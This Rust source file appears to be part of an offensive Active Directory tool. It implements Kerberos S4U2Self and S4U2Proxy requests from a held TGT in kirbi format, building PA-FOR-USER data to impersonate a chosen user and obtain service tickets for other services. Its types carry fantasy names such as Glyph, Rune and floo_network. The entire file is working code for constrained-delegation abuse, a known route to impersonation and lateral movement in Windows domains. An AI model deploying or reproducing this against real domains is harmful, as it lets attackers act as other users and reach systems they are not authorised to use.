use anyhow::{bail, Result};
use rand::random;

use crate::dungeon::krb_structures::*;
use crate::dungeon::floo_network;
use crate::dungeon::wand_utils;
use crate::dungeon::potions;
use crate::dungeon::request_magic::{parse_kirbi_tgt_pub, parse_kirbi_cname};

// S4U2Self: get a service ticket to yourself on behalf of another user
pub fn s4u2self(
    impersonate: &str,
    spn: &str,
    tgt_kirbi: &[u8],
    domain: &str,
    dc: Option<&str>,
) -> Result<Vec<u8>> {
    let (ticket, session_key, cname) = parse_kirbi_tgt_pub(tgt_kirbi)?;
    let nonce: u32 = random();
    let pa_for_user = build_pa_for_user(impersonate, domain, &session_key)?;
    let sname = Glyph { kind: NT_SRV_INST, parts: spn.splitn(2, '/').map(|s| s.to_string()).collect() };
    let ap_req = build_ap_req_s4u(&ticket, &session_key, &cname, nonce)?;
    let pa_tgs = Rune::tgs_req(&ap_req);
    let padata = vec![pa_tgs, pa_for_user];
    let tgs_req = TomeRequest::new_tgs_req(domain, sname, &[ETYPE_RC4_HMAC, ETYPE_AES256_CTS_HMAC_SHA1_96], padata, nonce);
    let dc_addr = match dc {
        Some(d) => d.to_owned(),
        None => floo_network::resolve_dc(domain)?,
    };
    let resp = floo_network::send_receive_kdc(&dc_addr, &tgs_req.encode())?;
    if DarkProphecy::is_error(&resp) {
        let e = DarkProphecy::decode(&resp)?;
        bail!("S4U2Self error {}: {}", e.error_code, error_string(e.error_code));
    }
    Ok(resp)
}

// S4U2Proxy: use the S4U2Self ticket to get a service ticket for another SPN
pub fn s4u2proxy(
    s4u2self_ticket_bytes: &[u8],
    target_spn: &str,
    tgt_kirbi: &[u8],
    domain: &str,
    dc: Option<&str>,
) -> Result<Vec<u8>> {
    let (ticket, session_key, cname) = parse_kirbi_tgt_pub(tgt_kirbi)?;
    let nonce: u32 = random();
    let parts: Vec<&str> = target_spn.splitn(2, '/').collect();
    let sname = if parts.len() == 2 {
        Glyph { kind: NT_SRV_INST, parts: parts.iter().map(|s| s.to_string()).collect() }
    } else {
        Glyph::new_principal(target_spn)
    };
    let ap_req = build_ap_req_s4u(&ticket, &session_key, &cname, nonce)?;
    let pa_tgs = Rune::tgs_req(&ap_req);
    let mut tgs_req = TomeRequest::new_tgs_req(domain, sname, &[ETYPE_RC4_HMAC, ETYPE_AES256_CTS_HMAC_SHA1_96], vec![pa_tgs], nonce);
    tgs_req.body.kdc_options |= KDC_OPT_CNAME_IN_ADDL_TKT;
    tgs_req.body.additional_tickets.push(s4u2self_ticket_bytes.to_vec());
    let dc_addr = match dc {
        Some(d) => d.to_owned(),
        None => floo_network::resolve_dc(domain)?,
    };
    let resp = floo_network::send_receive_kdc(&dc_addr, &tgs_req.encode())?;
    if DarkProphecy::is_error(&resp) {
        let e = DarkProphecy::decode(&resp)?;
        bail!("S4U2Proxy error {}: {}", e.error_code, error_string(e.error_code));
    }
    Ok(resp)
}

fn build_pa_for_user(username: &str, realm: &str, session_key: &MagicKey) -> Result<Rune> {
    use hmac::{Hmac, Mac};
    use md5::Md5;
    let pname_der  = Glyph::new_principal(username).encode();
    let realm_der  = encode_general_string(realm);
    let auth_pkg   = encode_general_string("Kerberos");
    // MS-SFU §2.2.3: HMAC-MD5 over raw username || realm || "Kerberos" bytes (no DER wrapping)
    let mut body = Vec::new();
    body.extend_from_slice(username.as_bytes());
    body.extend_from_slice(realm.as_bytes());
    body.extend_from_slice(b"Kerberos");
    type HmacMd5 = Hmac<Md5>;
    let mut mac = <HmacMd5 as Mac>::new_from_slice(&session_key.keyvalue).unwrap();
    mac.update(&body);
    let cksum = mac.finalize().into_bytes().to_vec();
    let inner = [
        encode_ctx(0, &pname_der),
        encode_ctx(1, &realm_der),
        encode_ctx(2, &Sigil { cksumtype: -138, checksum: cksum }.encode()),
        encode_ctx(3, &auth_pkg),
    ].concat();
    Ok(Rune { pa_type: PA_FOR_USER, pa_value: encode_sequence(&inner) })
}

fn build_ap_req_s4u(ticket: &Scroll, session_key: &MagicKey, cname: &Glyph, nonce: u32) -> Result<Vec<u8>> {
    let now = wand_utils::generalized_time_now();
    let auth_inner = [
        encode_ctx(0, &encode_uint32(5)),
        encode_ctx(1, &encode_general_string(&ticket.realm)),
        encode_ctx(2, &cname.encode()),  // RFC 4120 §5.5.1: client's own principal
        encode_ctx(4, &encode_generalized_time(&now)),
        encode_ctx(5, &encode_uint32(0)),
    ].concat();
    let auth_plain = tlv(TAG_AUTHENTICATOR, &encode_sequence(&auth_inner));
    let sealed = SealedChamber::new(
        session_key.keytype,
        potions::enchant(session_key.keytype, &session_key.keyvalue, KU_TGS_REQ_AUTH, &auth_plain)?,
    );
    let ap_req_inner = [
        encode_ctx(0, &encode_uint32(5)),
        encode_ctx(1, &encode_uint32(14)),
        encode_ctx(2, &encode_bit_string_flags(0)),
        encode_ctx(3, &ticket.encode()),
        encode_ctx(4, &sealed.encode()),
    ].concat();
    Ok(tlv(TAG_AP_REQ, &encode_sequence(&ap_req_inner)))
}
